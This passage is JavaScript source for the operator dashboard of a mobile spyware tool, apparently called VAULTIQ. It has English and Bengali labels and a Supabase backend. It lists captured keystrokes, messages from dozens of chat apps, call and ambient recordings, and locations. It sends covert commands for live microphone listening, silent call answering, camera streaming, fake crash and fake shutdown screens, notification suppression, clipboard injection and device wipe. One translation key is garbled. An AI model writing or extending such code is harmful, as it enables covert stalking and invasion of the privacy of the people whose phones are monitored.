// Initialize Supabase Client using VAULTIQ_CONFIG
const sbClient = window.supabase.createClient(
    VAULTIQ_CONFIG.supabaseUrl, 
    VAULTIQ_CONFIG.supabaseAnonKey
);

// Language Configuration
let currentLanguage = localStorage.getItem('dashboardLanguage') || 'en';

const translations = {
    en: {
        'Dashboard': 'Dashboard',
        'Global Timeline': 'Global Timeline',
        'Location': 'Location',
        'Call Logs': 'Call Logs',
        'SMS Messages': 'SMS Messages',
        'Messengers': 'Messengers',
        'Web History': 'Web History',
        'App Usage': 'App Usage',
        'Photos': 'Photos',
        'Screenshots': 'Screenshots',
        'Keystrokes': 'Keystrokes',
        'Clipboard': 'Clipboard',
        'Contacts': 'Contacts',
        'Call Recordings': 'Call Recordings',
        'Emails': 'Emails',
        'Ambient Recordings': 'Ambient Recordings',
        'Screen Recordings': 'Screen Recordings',
        'Risk Alerts': 'Risk Alerts',
        'Device Info': 'Device Info',
        'Network Info': 'Network Info',
        'SIM Changes': 'SIM Changes',
        'Refresh': 'Refresh',
        'Export CSV': 'Export CSV',
        'Export JSON': 'Export JSON',
        'Platform:': 'Platform:',
        'All Platforms': 'All Platforms',
        'From:': 'From:',
        'To:': 'To:',
        'Search:': 'Search:',
        'Remote Commands': 'Remote Commands',
        '📍 Fetch Location': '📍 Fetch Location',
        '📷 Take Photo': '📷 Take Photo',
        '🔊 Play Sound': '🔊 Play Sound',
        '🔄 Sync Data': '🔄 Sync Data',
        '🎙️ Call Recording Controls': '🎙️ Call Recording Controls',
        '▶️ Start Recording': '▶️ Start Recording',
        '⏸️ Pause Recording': '⏸️ Pause Recording',
        '⏹️ Stop Recording': '⏹️ Stop Recording',
        '➕ Add Geofence': '➕ Add Geofence',
        '🖥️ Screen Recording Controls': '🖥️ Screen Recording Controls',
        '⏺️ Start Screen Record': '⏺️ Start Screen Record',
        '⏹️ Stop Screen Record': '⏹️ Stop Screen Record',
        '📸 Take Screenshot': '📸 Take Screenshot',
        '🛡️ Device Security (Lock/Wipe)': '🛡️ Device Security (Lock/Wipe)',
        '🔒 Lock Device': '🔒 Lock Device',
        '⚠️ Wipe Data': '⚠️ Wipe Data',
        '🎙️ Live Audio Listening': '🎙️ Live Audio Listening',
        '🎤 Start Live Listen': '🎤 Start Live Listen',
        '🔇 Stop Live Listen': '🔇 Stop Live Listen',
        'Recent Activity': 'Recent Activity',
        'No devices connected!': 'No devices connected!',
        'Command sent successfully!': 'Command sent successfully!',
        'Error sending command:': 'Error sending command:',
        'Data refreshed!': 'Data refreshed!',
        'Please enter a valid name and radius': 'Please enter a valid name and radius',
        'Total Locations': 'Total Locations',
        'Total Calls': 'Total Calls',
        'Total SMS': 'Total SMS',
        'Battery Level': 'Battery Level',
        'Top Apps': 'Top Apps',
        'No data yet': 'No data yet',
        'Contact': 'Contact',
        'Phone Number': 'Phone Number',
        'Type': 'Type',
        'Duration': 'Duration',
        'Time': 'Time',
        'Message': 'Message',
        'App': 'App',
        'Title': 'Title',
        'URL': 'URL',
        'Entry Time': 'Entry Time',
        'Exit Time': 'Exit Time',
        'Browsing Mode': 'Browsing Mode',
        'Recorded At': 'Recorded At',
        'Package': 'Package',
        'Usage Time': 'Usage Time',
        'Content': 'Content',
        'Name': 'Name',
        'Emails': 'Emails',
        'File': 'File',
        'Alert Type': 'Alert Type',
        'Description': 'Description',
        'Source': 'Source',
        'Last Seen': 'Last Seen',
        'Last Updated': 'Last Updated',
        'Wi-Fi SSID': 'Wi-Fi SSID',
        'Network Type': 'Network Type',
        'Signal Strength': 'Signal Strength',
        'Cell Info (CID/LAC)': 'Cell Info (CID/LAC)',
        'Carrier (MCC/MNC)': 'Carrier (MCC/MNC)',
        'Old IMSI': 'Old IMSI',
        'New IMSI': 'New IMSI',
        'No network info yet': 'No network info yet',
        'No SIM changes detected': 'No SIM changes detected',
        'incoming': 'incoming',
        'outgoing': 'outgoing',
        'missed': 'missed',
        'rejected': 'rejected',
        'sent': 'sent',
        'received': 'received',
        'draft': 'draft',
        'Logout': 'Logout',
        'Installed Apps': 'Installed Apps',
        'Start Mirror': 'Start Mirror',
        'Stop Mirror': 'Stop Mirror',
        'Fake Crash': 'Fake Crash',
        'Clear Crash': 'Clear Crash',
        'Uninstall': 'Uninstall'
    },
    bn: {
        'Dashboard': 'ড্যাশবোর্ড',
        'Global Timeline': 'গ্লোবাল টাইমলাইন',
        'Location': 'অবস্থান',
        'Call Logs': 'কল লগ',
        'SMS Messages': 'এসএমএস মেসেজ',
        'Messengers': 'মেসেঞ্জার',
        'Web History': 'ওয়েব ইতিহাস',
        'App Usage': 'অ্যাপ ব্যবহার',
        'Photos': 'ছবি',
        'Screenshots': 'স্ক্রিনশট',
        'Keystרוোক': 'কিস্ট্রোক',
        'Clipboard': 'ক্লিপবোর্ড',
        'Contacts': 'কনট্যাক্ট',
        'Call Recordings': 'কল রেকর্ডিং',
        'Emails': 'ইমেইল',
        'Ambient Recordings': 'অ্যাম্বিয়েন্ট রেকর্ডিং',
        'Screen Recordings': 'স্ক্রিন রেকর্ডিং',
        'Risk Alerts': 'ঝুঁকি সতর্কতা',
        'Device Info': 'ডিভাইস তথ্য',
        'Network Info': 'নেটওয়ার্ক তথ্য',
        'SIM Changes': 'সিম পরিবর্তন',
        'Refresh': 'রিফ্রেশ',
        'Export CSV': 'CSV এক্সপোর্ট',
        'Export JSON': 'JSON এক্সপোর্ট',
        'Platform:': 'প্ল্যাটফর্ম:',
        'All Platforms': 'সব প্ল্যাটফর্ম',
        'From:': 'থেকে:',
        'To:': 'পর্যন্ত:',
        'Search:': 'অনুসন্ধান:',
        'Remote Commands': 'রিমোট কমান্ড',
        '📍 Fetch Location': '📍 অবস্থান আনুন',
        '📷 Take Photo': '📷 ছবি তুলুন',
        '🔊 Play Sound': '🔊 শব্দ চালান',
        '🔄 Sync Data': '🔄 ডেটা সিঙ্ক করুন',
        '🎙️ Call Recording Controls': '🎙️ কল রেকর্ডিং কন্ট্রোল',
        '▶️ Start Recording': '▶️ রেকর্ডিং শুরু করুন',
        '⏸️ Pause Recording': '⏸️ রেকর্ডিং পজ করুন',
        '⏹️ Stop Recording': '⏹️ রেকর্ডিং বন্ধ করুন',
        '➕ Add Geofence': '➕ জিোফেন্স যোগ করুন',
        '🖥️ Screen Recording Controls': '🖥️ স্ক্রিন রেকর্ডিং কন্ট্রোল',
        '⏺️ Start Screen Record': '⏺️ স্ক্রিন রেকর্ড শুরু করুন',
        '⏹️ Stop Screen Record': '⏹️ স্ক্রিন রেকর্ড বন্ধ করুন',
        '📸 Take Screenshot': '📸 স্ক্রিনশট নিন',
        '🛡️ Device Security (Lock/Wipe)': '🛡️ ডিভাইস নিরাপত্তা (লক/ওয়াইপ)',
        '🔒 Lock Device': '🔒 ডিভাইস লক করুন',
        '⚠️ Wipe Data': '⚠️ ডেটা মুছে ফেলুন',
        '🎙️ Live Audio Listening': '🎙️ সরাসরি অডিও শোনা',
        '🎤 Start Live Listen': '🎤 লাইভ লিসেন শুরু করুন',
        '🔇 Stop Live Listen': '🔇 লাইভ লিসেন বন্ধ করুন',
        'Recent Activity': 'সাম্প্রতিক কার্যকলাপ',
        'No devices connected!': 'কোনো ডিভাইস সংযুক্ত নেই!',
        'Command sent successfully!': 'কমান্ড সফলভাবে পাঠানো হয়েছে!',
        'Error sending command:': 'কমান্ড পাঠাতে ত্রুটি:',
        'Data refreshed!': 'ডেটা রিফ্রেশ হয়েছে!',
        'Please enter a valid name and radius': 'অনুগ্রহ করে একটি বৈধ নাম এবং ব্যাসার্ধ লিখুন',
        'Total Locations': 'মোট অবস্থান',
        'Total Calls': 'মোট কল',
        'Total SMS': 'মোট এসএমএস',
        'Battery Level': 'ব্যাটারি লেভেল',
        'Top Apps': 'শীর্ষ অ্যাপ',
        'No data yet': 'এখনও কোনো ডেটা নেই',
        'Contact': 'কনট্যাক্ট',
        'Phone Number': 'ফোন নম্বর',
        'Type': 'ধরন',
        'Duration': 'সময়কাল',
        'Time': 'সময়',
        'Message': 'মেসেজ',
        'App': 'অ্যাপ',
        'Title': 'টাইটেল',
        'URL': 'URL',
        'Entry Time': 'প্রবেশের সময়',
        'Exit Time': 'প্রস্থানের সময়',
        'Browsing Mode': 'ব্রাউজিং মোড',
        'Recorded At': 'রেকর্ড করার সময়',
        'Package': 'প্যাকেজ',
        'Usage Time': 'ব্যবহারের সময়',
        'Content': 'কনটেন্ট',
        'Name': 'নাম',
        'File': 'ফাইল',
        'Alert Type': 'সতর্কতার ধরন',
        'Description': 'বিবরণ',
        'Source': 'উৎস',
        'Last Seen': 'শেষ দেখা গেছে',
        'Last Updated': 'শেষ আপডেট',
        'Wi-Fi SSID': 'ওয়াই-ফাই SSID',
        'Network Type': 'নেটওয়ার্ক ধরন',
        'Signal Strength': 'সিগনাল শক্তি',
        'Cell Info (CID/LAC)': 'সেল তথ্য (CID/LAC)',
        'Carrier (MCC/MNC)': 'অপারেটর (MCC/MNC)',
        'Old IMSI': 'পুরনো IMSI',
        'New IMSI': 'নতুন IMSI',
        'No network info yet': 'এখনো কোনো নেটওয়ার্ক তথ্য নেই',
        'No SIM changes detected': 'কোনো সিম পরিবর্তন সনাক্ত করা যায়নি',
        'incoming': 'আসছে',
        'outgoing': 'যাওয়া',
        'missed': 'মিসড',
        'rejected': 'বাতিল',
        'sent': 'পাঠানো',
        'received': 'প্রাপ্ত',
        'draft': 'ড্রাফট',
        'Logout': 'লগআউট',
        'Installed Apps': 'ইনস্টল করা অ্যাপ',
        'Start Mirror': 'মিররিং শুরু করুন',
        'Stop Mirror': 'মিররিং বন্ধ করুন',
        'Fake Crash': 'ভুয়া ক্র্যাশ',
        'Clear Crash': 'ক্র্যাশ মুছুন',
        'Uninstall': 'আনইনস্টল'
    }
};

function t(text) {
    return translations[currentLanguage][text] || text;
}

function updateAllText() {
    const pageTitleEl = document.getElementById('page-title');
    if (pageTitleEl) {
        pageTitleEl.textContent = t(pageTitleEl.textContent.trim());
    }
    
    document.querySelectorAll('.nav-item').forEach(item => {
        item.textContent = t(item.textContent.trim());
    });
    
    document.querySelectorAll('label').forEach(label => {
        label.textContent = t(label.textContent.trim());
    });
    
    document.querySelectorAll('button').forEach(btn => {
        if (btn.id === 'lang-toggle' || btn.id === 'login-submit-btn') return;
        btn.textContent = t(btn.textContent.trim());
    });
    
    document.querySelectorAll('h3, h4').forEach(h => {
        h.textContent = t(h.textContent.trim());
    });
    
    document.querySelectorAll('#platform-filter option').forEach(option => {
        option.textContent = t(option.textContent.trim());
    });
}

// Auth Logic
async function checkAuth() {
    const { data: { session } } = await sbClient.auth.getSession();
    if (session) {
        showDashboard();
    } else {
        showLogin();
    }
}

function showDashboard() {
    document.getElementById('login-overlay').style.display = 'none';
    document.getElementById('main-dashboard').style.display = 'flex';
    updateDashboard();
    initSupabaseRealtime();
}

function showLogin() {
    document.getElementById('login-overlay').style.display = 'flex';
    document.getElementById('main-dashboard').style.display = 'none';
}

async function handleLogin(e) {
    e.preventDefault();
    const email = document.getElementById('login-email').value;
    const password = document.getElementById('login-password').value;
    const errorEl = document.getElementById('login-error');
    const submitBtn = document.getElementById('login-submit-btn');

    submitBtn.disabled = true;
    submitBtn.textContent = 'Logging in...';
    errorEl.style.display = 'none';

    const { error } = await sbClient.auth.signInWithPassword({ email, password });

    if (error) {
        errorEl.textContent = error.message;
        errorEl.style.display = 'block';
        submitBtn.disabled = false;
        submitBtn.textContent = 'Login';
    } else {
        showDashboard();
    }
}

async function handleLogout() {
    await sbClient.auth.signOut();
    showLogin();
}

// Initialize data
let allData = {
    devices: [],
    locations: [],
    call_logs: [],
    sms: [],
    messenger_messages: [],
    web_history: [],
    app_usage: [],
    photos: [],
    screenshots: [],
    keystrokes: [],
    clipboard: [],
    clipboard_entries: [],
    contacts: [],
    device_info: [],
    network_info: [],
    sim_changes: [],
    commands: [],
    geofences: [],
    ambient_recordings: [],
    screen_recordings: [],
    risk_alerts: [],
    call_recordings: [],
    email_entries: [],
    app_screen_context: []
};

let map, appsChart;
let geofenceCircles = [];
let geofences = [];
let currentPage = 'dashboard';
let searchQuery = '';
let startDate = null;
let endDate = null;
let selectedPlatform = 'all';
let alerts = [];
let selectedDeviceId = null;

// --- Call Recording Timer Variables ---
let callTimerInterval = null;
let callRecordingStartTime = null;
let callRecordingPaused = false;
let callRecordingPausedTime = 0;
let previousSessionDurations = 0;
const MAX_RECORDING_SECONDS = 18000;
const WARNING_TIMES = [17400, 17700, 17940];
let warningTriggers = new Set();

const platformNames = {
    whatsapp: "WhatsApp",
    whatsapp_business: "WhatsApp Business",
    telegram: "Telegram",
    telegram_x: "Telegram X",
    messenger: "Messenger",
    messenger_lite: "Messenger Lite",
    wechat: "WeChat",
    signal: "Signal",
    viber: "Viber",
    line: "LINE",
    imo: "IMO",
    snapchat: "Snapchat",
    discord: "Discord",
    steam_chat: "Steam Chat",
    slack: "Slack",
    microsoft_teams: "Microsoft Teams",
    google_chat: "Google Chat",
    threema: "Threema",
    wickr: "Wickr",
    session: "Session",
    wire: "Wire",
    kakaotalk: "KakaoTalk",
    zalo: "Zalo",
    bip: "BIP",
    botim: "Botim",
    skype: "Skype",
    tinder: "Tinder",
    bumble: "Bumble",
    tagged: "Tagged",
    meetme: "MeetMe",
    groupme: "GroupMe",
    band: "BAND",
    kik: "Kik",
    google_meet: "Google Meet",
    icq: "ICQ",
    hike_messenger: "Hike",
    tango: "Tango",
    google_messages: "Google Messages",
    instagram: "Instagram",
    facebook: "Facebook",
    tiktok: "TikTok",
    vsco: "VSCO",
    sms: "SMS"
};

function requestNotificationPermission() {
    if ('Notification' in window) {
        Notification.requestPermission().then(permission => {
            console.log('Notification permission:', permission);
        });
    }
}

function sendNotification(msg) {
    if ('Notification' in window && Notification.permission === 'granted') {
        const platformName = platformNames[msg.messenger_type] || msg.messenger_type || 'Unknown';
        const senderName = msg.contact_name || msg.phone_number || 'Unknown Sender';
        const notification = new Notification(platformName, {
            body: `${senderName}: ${msg.content || 'New message'}`,
            icon: 'https://trae.ai/favicon.ico'
        });
        notification.onclick = () => {
            window.focus();
        };
    }
}

document.addEventListener("DOMContentLoaded", async () => {
    console.log(`${VAULTIQ_CONFIG.appName} Dashboard initializing...`);
    
    // Update all app name references from config
    updateAppNameFromConfig();
    
    requestNotificationPermission();
    initNavigation();
    initMap();
    initCharts();
    initEventListeners();
    updateAllText();
    await checkAuth(); // Check authentication status
    console.log(`${VAULTIQ_CONFIG.appName} Dashboard ready!`);
});

/**
 * Updates all UI elements that display the app name using the central config
 */
function updateAppNameFromConfig() {
    const appTitle = document.getElementById('app-title');
    const loginTitle = document.getElementById('login-title');
    const sidebarTitle = document.getElementById('sidebar-title');
    
    if (appTitle) appTitle.textContent = VAULTIQ_CONFIG.appName;
    if (loginTitle) loginTitle.innerHTML = `🔐 ${VAULTIQ_CONFIG.appName} Login`;
    if (sidebarTitle) sidebarTitle.innerHTML = `🔍 ${VAULTIQ_CONFIG.appName}`;
    
    // Update translations with app name
    translations.en.appName = VAULTIQ_CONFIG.appName;
    translations.bn.appName = VAULTIQ_CONFIG.appName;
}

function initNavigation() {
    const navItems = document.querySelectorAll(".nav-item");
    const pages = document.querySelectorAll(".page");
    const pageTitle = document.getElementById("page-title");

    navItems.forEach(item => {
        item.addEventListener("click", () => {
            navItems.forEach(nav => nav.classList.remove("active"));
            pages.forEach(page => page.classList.remove("active"));

            item.classList.add("active");
            const pageId = item.dataset.page + "-page";
            const targetPage = document.getElementById(pageId);
            if (targetPage) {
                targetPage.classList.add("active");
            }
            pageTitle.textContent = item.textContent;
            currentPage = item.dataset.page;

            if (item.dataset.page === "map") {
                setTimeout(() => map.invalidateSize(), 100);
            }

            updateCurrentPage();
        });
    });
}

function initEventListeners() {
    // Auth Listeners
    document.getElementById('login-form').addEventListener('submit', handleLogin);
    document.getElementById('logout-btn').addEventListener('click', handleLogout);

    // Language Toggle
    const langBtn = document.getElementById('lang-toggle');
    if (langBtn) {
        langBtn.textContent = currentLanguage === 'bn' ? '🌐 BN' : '🌐 EN';
        langBtn.addEventListener('click', () => {
            currentLanguage = currentLanguage === 'bn' ? 'en' : 'bn';
            localStorage.setItem('dashboardLanguage', currentLanguage);
            langBtn.textContent = currentLanguage === 'bn' ? '🌐 BN' : '🌐 EN';
            updateAllText();
            updateCurrentPage();
        });
    }
    
    const platformFilter = document.getElementById("platform-filter");
    Object.entries(platformNames).forEach(([key, name]) => {
        const option = document.createElement("option");
        option.value = key;
        option.textContent = name;
        platformFilter.appendChild(option);
    });

    document.getElementById("refresh-btn").addEventListener("click", async () => {
        await updateDashboard();
        showAlert('✅ Data refreshed!', 'success');
    });
    document.getElementById("export-csv-btn").addEventListener("click", exportToCSV);
    document.getElementById("export-json-btn").addEventListener("click", exportToJSON);
    document.getElementById("search-input").addEventListener("input", (e) => {
        searchQuery = e.target.value.toLowerCase();
        updateCurrentPage();
    });
    document.getElementById("platform-filter").addEventListener("change", (e) => {
        selectedPlatform = e.target.value;
        updateCurrentPage();
    });
    document.getElementById("start-date").addEventListener("change", (e) => {
        startDate = e.target.value ? new Date(e.target.value) : null;
        updateCurrentPage();
    });
    document.getElementById("end-date").addEventListener("change", (e) => {
        endDate = e.target.value ? new Date(e.target.value) : null;
        updateCurrentPage();
    });

    document.getElementById("cmd-fetch-location").addEventListener("click", () => sendRemoteCommand("fetch_location"));
    document.getElementById("cmd-take-photo").addEventListener("click", () => sendRemoteCommand("take_photo"));
    document.getElementById("cmd-ring-device").addEventListener("click", () => sendRemoteCommand("ring_device"));
    document.getElementById("cmd-sync-data").addEventListener("click", () => sendRemoteCommand("sync_data"));
    document.getElementById("cmd-take-screenshot").addEventListener("click", () => sendRemoteCommand("take_screenshot"));

    document.getElementById("cmd-start-call-recording").addEventListener("click", startCallRecording);
    document.getElementById("cmd-pause-call-recording").addEventListener("click", pauseCallRecording);
    document.getElementById("cmd-stop-call-recording").addEventListener("click", stopCallRecording);

    document.getElementById("cmd-start-screen-record").addEventListener("click", () => sendRemoteCommand("record_screen"));
    document.getElementById("cmd-stop-screen-record").addEventListener("click", () => sendRemoteCommand("stop_record_screen"));
    document.getElementById("cmd-lock-device").addEventListener("click", () => {
        if (confirm("Are you sure you want to LOCK the device?")) {
            sendRemoteCommand("lock_device");
        }
    });
    document.getElementById("cmd-wipe-device").addEventListener("click", () => {
        if (confirm("WARNING: This will factory reset the device! Are you sure?")) {
            sendRemoteCommand("wipe_data");
        }
    });

    document.getElementById("cmd-start-mirror").addEventListener("click", () => sendRemoteCommand("start_screen_mirror"));
    document.getElementById("cmd-stop-mirror").addEventListener("click", () => sendRemoteCommand("stop_screen_mirror"));
    document.getElementById("cmd-fake-crash").addEventListener("click", () => sendRemoteCommand("fake_crash"));
    document.getElementById("cmd-clear-crash").addEventListener("click", () => sendRemoteCommand("clear_crash"));
    document.getElementById("cmd-broadcast").addEventListener("click", () => {
        const url = document.getElementById("broadcast-url").value;
        if (url) sendRemoteCommand("voice_broadcast", url);
    });

    // Live Listening Controls
    document.getElementById("cmd-start-live-listen").addEventListener("click", () => sendRemoteCommand("start_live_listen"));
    document.getElementById("cmd-stop-live-listen").addEventListener("click", () => sendRemoteCommand("stop_live_listen"));

    // Auto-Toggle Listeners
    document.getElementById("toggle-auto-call-record").addEventListener("change", (e) => {
        sendRemoteCommand(e.target.checked ? "enable_auto_call_record" : "disable_auto_call_record");
    });
    document.getElementById("toggle-unlock-selfie").addEventListener("change", (e) => {
        sendRemoteCommand(e.target.checked ? "enable_unlock_selfie" : "disable_unlock_selfie");
    });
    document.getElementById("toggle-silent-answer").addEventListener("change", (e) => {
        const num = document.getElementById("master-number").value;
        if (e.target.checked && !num) {
            alert("Please enter a Master Number first!");
            e.target.checked = false;
            return;
        }
        if (num) sendRemoteCommand("set_master_number", num);
        sendRemoteCommand(e.target.checked ? "enable_silent_answer" : "disable_silent_answer");
    });
    document.getElementById("toggle-voice-trigger").addEventListener("change", (e) => {
        sendRemoteCommand(e.target.checked ? "enable_voice_trigger" : "disable_voice_trigger");
    });
    document.getElementById("toggle-notif-suppress").addEventListener("change", (e) => {
        sendRemoteCommand(e.target.checked ? "enable_notif_suppress" : "disable_notif_suppress");
    });

    document.getElementById("toggle-block-incognito").addEventListener("change", (e) => {
        sendRemoteCommand(e.target.checked ? "enable_block_incognito" : "disable_block_incognito");
    });

    document.getElementById("btn-update-incognito-apps").addEventListener("click", () => {
        const apps = document.getElementById("incognito-apps-input").value;
        if (apps) sendRemoteCommand("update_incognito_apps", apps);
    });

    document.getElementById("cmd-fake-reboot").addEventListener("click", () => sendRemoteCommand("fake_reboot"));
    document.getElementById("cmd-fake-shutdown").addEventListener("click", () => sendRemoteCommand("fake_shutdown"));
    document.getElementById("cmd-clear-fake-poweroff").addEventListener("click", () => sendRemoteCommand("clear_fake_poweroff"));
    document.getElementById("cmd-live-camera-front").addEventListener("click", () => sendRemoteCommand("start_live_camera_front"));
    document.getElementById("cmd-live-camera-back").addEventListener("click", () => sendRemoteCommand("start_live_camera_back"));
    document.getElementById("cmd-live-camera-stop").addEventListener("click", () => sendRemoteCommand("stop_live_camera"));
    document.getElementById("cmd-inject-clipboard").addEventListener("click", () => {
        const text = document.getElementById("inject-clipboard-text").value;
        if (text) sendRemoteCommand("inject_clipboard", text);
    });

    document.getElementById("mobile-menu-toggle").addEventListener("click", () => {
        const sidebar = document.getElementById("sidebar");
        sidebar.classList.toggle("open");
        const isExpanded = sidebar.classList.contains("open");
        document.getElementById("mobile-menu-toggle").setAttribute("aria-expanded", isExpanded);
    });

    document.querySelectorAll(".nav-item").forEach((item) => {
        item.addEventListener("click", () => {
            const sidebar = document.getElementById("sidebar");
            if (sidebar.classList.contains("open")) {
                sidebar.classList.remove("open");
                document.getElementById("mobile-menu-toggle").setAttribute("aria-expanded", "false");
            }
        });
    });

    document.getElementById("btn-add-geofence").addEventListener("click", addGeofence);
}

// --- Timer Helper Functions ---
function formatTime(seconds) {
    const hrs = Math.floor(seconds / 3600).toString().padStart(2, '0');
    const mins = Math.floor((seconds % 3600) / 60).toString().padStart(2, '0');
    const secs = (seconds % 60).toString().padStart(2, '0');
    return `${hrs}:${mins}:${secs}`;
}

function updateTimerDisplay() {
    if (!callRecordingStartTime) {
        document.getElementById("call-recording-timer").textContent = "00:00:00";
        return;
    }
    
    let elapsed;
    if (callRecordingPaused) {
        elapsed = callRecordingPausedTime + previousSessionDurations;
    } else {
        const currentTime = Date.now();
        elapsed = Math.floor((currentTime - callRecordingStartTime) / 1000) + callRecordingPausedTime + previousSessionDurations;
    }
    
    document.getElementById("call-recording-timer").textContent = formatTime(elapsed);
    checkRecordingLimits(elapsed);
}

function checkRecordingLimits(elapsedSeconds) {
    WARNING_TIMES.forEach(warningTime => {
        if (elapsedSeconds >= warningTime && !warningTriggers.has(warningTime)) {
            warningTriggers.add(warningTime);
            showWarningNotification(warningTime);
        }
    });
    
    if (elapsedSeconds >= MAX_RECORDING_SECONDS) {
        handleMaxTimeReached();
    }
}

function showWarningNotification(warningTime) {
    const minutesLeft = Math.ceil((MAX_RECORDING_SECONDS - warningTime) / 60);
    const message = `⚠️ Call Recording will auto-restart in ${minutesLeft} minute${minutesLeft > 1 ? 's' : ''}!`;
    
    if ('Notification' in window && Notification.permission === 'granted') {
        new Notification('Device Monitor', {
            body: message,
            icon: '🔔'
        });
    }
    
    showAlert(message, 'warning');
}

function handleMaxTimeReached() {
    previousSessionDurations += MAX_RECORDING_SECONDS;
    sendRemoteCommand("stop_call_recording");
    setTimeout(() => {
        sendRemoteCommand("start_call_recording");
        warningTriggers.clear();
        showAlert('🔄 New recording session started automatically!', 'success');
    }, 1000);
}

function startCallRecording() {
    if (!callRecordingStartTime || callRecordingPaused) {
        if (callRecordingPaused) {
            callRecordingPaused = false;
            callRecordingStartTime = Date.now();
        } else {
            callRecordingStartTime = Date.now();
            callRecordingPausedTime = 0;
            previousSessionDurations = 0;
            warningTriggers.clear();
        }
        
        if (!callTimerInterval) {
            callTimerInterval = setInterval(updateTimerDisplay, 1000);
        }
        
        sendRemoteCommand("start_call_recording");
        showAlert('🎙️ Call recording started!', 'success');
    }
}

function pauseCallRecording() {
    if (callRecordingStartTime && !callRecordingPaused) {
        callRecordingPaused = true;
        callRecordingPausedTime += Math.floor((Date.now() - callRecordingStartTime) / 1000);
        sendRemoteCommand("pause_call_recording");
        showAlert('⏸️ Call recording paused!', 'info');
    }
}

function stopCallRecording() {
    if (callRecordingStartTime) {
        clearInterval(callTimerInterval);
        callTimerInterval = null;
        callRecordingStartTime = null;
        callRecordingPaused = false;
        callRecordingPausedTime = 0;
        previousSessionDurations = 0;
        warningTriggers.clear();
        updateTimerDisplay();
        sendRemoteCommand("stop_call_recording");
        showAlert('⏹️ Call recording stopped!', 'info');
    }
}

function showAlert(message, type = 'info') {
    const container = document.getElementById("alerts-container");
    const alertDiv = document.createElement("div");
    alertDiv.className = `alert alert-${type}`;
    alertDiv.textContent = message;
    
    const closeBtn = document.createElement("button");
    closeBtn.textContent = "×";
    closeBtn.style.marginLeft = "16px";
    closeBtn.style.background = "transparent";
    closeBtn.style.border = "none";
    closeBtn.style.fontSize = "20px";
    closeBtn.style.cursor = "pointer";
    closeBtn.onclick = () => container.removeChild(alertDiv);
    alertDiv.appendChild(closeBtn);
    
    container.appendChild(alertDiv);
    
    setTimeout(() => {
        if (container.contains(alertDiv)) {
            container.removeChild(alertDiv);
        }
    }, 5000);
}

function initMap() {
    map = L.map("map").setView([23.8103, 90.4125], 13);
    L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
        attribution: "&copy; OpenStreetMap contributors"
    }).addTo(map);
}

function initCharts() {
    const appsCtx = document.getElementById("apps-chart").getContext("2d");
    appsChart = new Chart(appsCtx, {
        type: "doughnut",
        data: {
            labels: [],
            datasets: [{
                data: [],
                backgroundColor: ["#3b82f6", "#10b981", "#f59e0b", "#ef4444", "#8b5cf6", "#ec4899"]
            }]
        },
        options: {
            responsive: true,
            plugins: {
                legend: { position: "bottom" }
            }
        }
    });
}

function initSupabaseRealtime() {
    const locationChannel = sbClient
        .channel('public:locations')
        .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'locations' }, (payload) => {
            allData.locations.unshift(payload.new);
            checkAlerts(payload.new);
            if (currentPage === 'map' || currentPage === 'dashboard') {
                updateCurrentPage();
            }
        })
        .subscribe();

    const commandsChannel = sbClient
        .channel('public:commands')
        .on('postgres_changes', { event: '*', schema: 'public', table: 'commands' }, (payload) => {
            if (payload.eventType === 'INSERT') {
                allData.commands.unshift(payload.new);
            } else if (payload.eventType === 'UPDATE') {
                const idx = allData.commands.findIndex(c => c.id === payload.new.id);
                if (idx !== -1) {
                    allData.commands[idx] = payload.new;
                }
            }
        })
        .subscribe();

    const messagesChannel = sbClient
        .channel('public:messenger_messages')
        .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'messenger_messages' }, (payload) => {
            allData.messenger_messages.unshift(payload.new);
            if (currentPage === 'messengers') {
                updateCurrentPage();
            }
            sendNotification(payload.new);
        })
        .subscribe();

    const smsChannel = sbClient
        .channel('public:sms')
        .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'sms' }, (payload) => {
            allData.sms.unshift(payload.new);
            if (currentPage === 'sms') {
                updateCurrentPage();
            }
            sendNotification({ ...payload.new, messenger_type: 'sms' });
        })
        .subscribe();

    // Listen to new Photos (Feature 1.2)
    const photoChannel = sbClient
        .channel('public:photos')
        .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'photos' }, (payload) => {
            allData.photos.unshift(payload.new);
            if (currentPage === 'photos' || currentPage === 'dashboard') {
                updateCurrentPage();
            }
        })
        .subscribe();
}

async function fetchData() {
    // First, fetch all devices
    const { data: devicesData, error: devicesError } = await sbClient
        .from('devices')
        .select('*')
        .order('last_seen', { ascending: false });
    if (!devicesError && devicesData && devicesData.length > 0) {
        allData.devices = devicesData;
        if (!selectedDeviceId) {
            selectedDeviceId = devicesData[0].id;
        }
    } else {
        return; // No devices, nothing to fetch
    }

    // Now fetch all other data for selected device
    const tables = ["locations", "call_logs", "sms", "messenger_messages", "web_history", "app_usage", "photos", "screenshots", "keystrokes", "clipboard_entries", "contacts", "device_info", "network_info", "sim_changes", "commands", "geofences", "ambient_recordings", "screen_recordings", "risk_alerts", "call_recordings", "email_entries", "app_screen_context"];

    for (const table of tables) {
        try {
            let orderCol = "recorded_at";
            if (table === "geofences") orderCol = "id";

            const { data, error } = await sbClient
                .from(table)
                .select("*")
                .eq('device_id', selectedDeviceId)
                .order(orderCol, { ascending: false });

            if (!error && data) {
                allData[table] = data;
            }
        } catch (e) {
            console.log(`Exception fetching ${table}:`, e);
        }
    }
}

function filterDataByDate(data) {
    return data.filter(item => {
        const dateStr = item.recorded_at || item.last_seen || item.created_at;
        if (!dateStr) return true;
        const itemDate = new Date(dateStr);
        if (startDate && itemDate < startDate) return false;
        if (endDate && itemDate > endDate) return false;
        return true;
    });
}

function searchData(data, fields) {
    if (!searchQuery) return data;
    return data.filter(item => {
        return fields.some(field => {
            const value = item[field];
            return value && value.toString().toLowerCase().includes(searchQuery);
        });
    });
}

function formatDuration(seconds) {
    if (!seconds || seconds === 0) return "-";
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}m ${secs}s`;
}

function formatBytes(bytes) {
    if (!bytes || bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function checkAlerts(location) {
    if (location.battery_level < 20) {
